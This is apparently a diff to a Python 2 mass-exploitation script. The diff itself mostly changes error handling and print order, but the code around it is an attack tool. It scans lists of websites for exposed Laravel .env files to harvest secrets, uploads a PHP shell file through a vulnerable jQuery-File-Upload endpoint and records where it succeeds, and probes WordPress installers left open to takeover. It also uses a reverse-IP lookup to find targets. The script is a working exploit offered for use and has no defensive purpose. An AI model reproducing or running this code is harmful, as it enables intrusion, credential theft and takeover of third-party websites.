@@ -6,6 +6,8 @@
 
 import requests
 import os
+from requests.exceptions import ConnectionError
+
 headers = {
   "User-Agent": "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36",
 }
@@ -47,12 +49,11 @@ def LeNv():
 	fs.sort()
 	for site in fs:
 		print bcolors.NORMAL
+		print "Try it => {}".format(site)
 		try:
-			requests.post(site, headers, timeout=10)
 			eNv = "{}/.env".format(site)
 			r = requests.get(eNv, timeout=5)
 			rel = r.text
-			print "Try it => {}".format(site)
 			if "APP_ENV" in rel:
 				print(bcolors.HIJAU + " [OK] Laravel")
 				if "malitrap.io" in rel:
@@ -64,8 +65,8 @@ def LeNv():
 					lw.write(r.url + "\n")
 			else:
 				print(bcolors.MERAH + " [BAD] Laravel")
-		except requests.exceptions.Timeout:
-			print "Timeout occurred"
+		except ConnectionError:
+   			print(bcolors.BIRU + " [BAD URL] {}".format(site))
 	print bcolors.NORMAL
 	lw.close()
 
@@ -76,6 +77,8 @@ def rIp():
 	print " / _, _/  __/ |/ /  __/ /  (__  )  __// // ____/ "
 	print "/_/ |_|\___/|___/\___/_/  /____/\___/___/_/      "
 	print "                                API Hacker Target"
+	print " Example :"
+	print " Input your domain : detik.com"
 	print bcolors.NORMAL
 	rd = raw_input("Input your domain : ")
 	r = requests.get("https://api.hackertarget.com/reverseiplookup/?q={}".format(rd), timeout=5)
@@ -123,10 +126,9 @@ def jQuL():
 	js = open(jl, "r").read().split()
 	js.sort()
 	for site in js:
+		print bcolors.NORMAL
+		print "Try it => {}".format(site)
 		try:
-			print bcolors.NORMAL
-			requests.post(site, headers, timeout=10)
-			print "Try it => {}".format(site)
 			r = requests.post("{}/assets/plugins/jquery-file-upload/server/php/index.php".format(site), files=files)
 			rc = requests.get("{}/assets/plugins/jquery-file-upload/server/php/files/zb-uploader.php".format(site))
 			rjq = rc.text
@@ -136,8 +138,8 @@ def jQuL():
 				jw.write(site + "/assets/plugins/jquery-file-upload/server/php/files/zb-uploader.php\n")
 			else:
 				print(bcolors.MERAH + " [BAD] Upload Failed")
-		except requests.exceptions.Timeout:
-  			print "Timeout occurred"
+		except ConnectionError:
+   			print(bcolors.BIRU + " [BAD URL] {}".format(site))
   	print bcolors.NORMAL
   	jw.close()
 
@@ -158,13 +160,16 @@ def wPI():
 		print "Try it => {}".format(site)
 		i = 0
 		while i < len(patchw):
-			r = requests.get("{}{}/wp-admin/setup-config.php?step=0".format(site, patchw[i]), timeout=5)
-			rwp = r.text
-			if "setup-config.php?step=1" in rwp:
-				print(bcolors.HIJAU + " [OK] {}{}".format(site, patchw[i]))
-				ww.write("{}{}".format(site, patchw[i]) + "\n")
-			else:
-				print(bcolors.MERAH + " [BAD] {}{}".format(site, patchw[i]))
+			try:
+				r = requests.get("{}{}/wp-admin/setup-config.php?step=0".format(site, patchw[i]), timeout=5)
+				rwp = r.text
+				if "setup-config.php?step=1" in rwp:
+					print(bcolors.HIJAU + " [OK] {}{}".format(site, patchw[i]))
+					ww.write("{}{}".format(site, patchw[i]) + "\n")
+				else:
+					print(bcolors.MERAH + " [BAD] {}{}".format(site, patchw[i]))
+			except ConnectionError:
+				print(bcolors.BIRU + " [BAD URL] {}".format(site))
 			i += 1
 	print bcolors.NORMAL
 	ww.close()
